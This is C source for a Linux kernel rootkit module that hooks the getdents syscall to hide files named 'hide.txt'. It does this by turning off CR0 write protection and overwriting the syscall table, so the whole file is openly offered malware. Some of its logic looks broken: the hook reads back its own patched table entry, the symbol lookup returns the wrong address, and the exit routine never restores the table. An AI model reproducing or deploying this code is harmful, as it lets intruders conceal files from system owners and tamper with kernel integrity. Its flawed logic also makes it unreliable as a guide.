// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://x86sec.com/posts/2020/03/08/linux-kernel-rootkit/
 */
#include "./include/files_hook.h"

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>

unsigned long *custom_kallsyms_lookup(void)
{
	register_kprobe(&kp);
	unsigned long *table = (unsigned long *)kp.addr;
	unregister_kprobe(&kp);
	return table;
}

/* https://www.man7.org/linux/man-pages/man2/getdents.2.html */
asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int ret;
	struct linux_dirent* cur = dirp;
	int pos = 0;

	unsigned long *table = custom_kallsyms_lookup();
	getdents_t getdents = (getdents_t)table[__NR_getdents];

	// Call original getdents
	ret = getdents(fd, dirp, count);
	while (pos < ret)
	{
		if (strncmp(cur->d_name, "hide.txt", strlen("hide.txt")) == 0)
		{
			// Remove hidden file from list
			int reclen = cur->d_reclen;
			char* next_rec = (char*)cur + reclen;
			int len = (uintptr_t)dirp + ret - (uintptr_t)next_rec;  // Updated casts to uintptr_t
			memmove(cur, next_rec, len);
			ret -= reclen;
			continue;
		}
		pos += cur->d_reclen;
		cur = (struct linux_dirent*) ((char*)dirp + pos);
	}
	return ret;
}

static int __init files_hook_init(void)
{
	unsigned long *table = custom_kallsyms_lookup();

	/* https://stackoverflow.com/questions/63661249/what-does-write-cr0read-cr0-0x10000-do
	   Enable write access */
	write_cr0(read_cr0() & (~ 0x10000));
	original_getdents = (getdents_t)table[__NR_getdents];
	//getdents64 = (void*)table[__NR_getdents64];

	table[__NR_getdents] = (unsigned long)hook_getdents;
	//table[__NR_getdents64] = (unsigned long) hook_getdents64;
	/* Restore write protection */
	write_cr0(read_cr0() | 0x10000);

	return 0;
}

static void __exit files_hook_exit(void)
{
	pr_info("files_hook exit successfully\n");
}

	module_init(files_hook_init)
module_exit(files_hook_exit)
	MODULE_AUTHOR("MikeHorn-git");
	MODULE_DESCRIPTION("files_hook");
	MODULE_LICENSE("GPL");
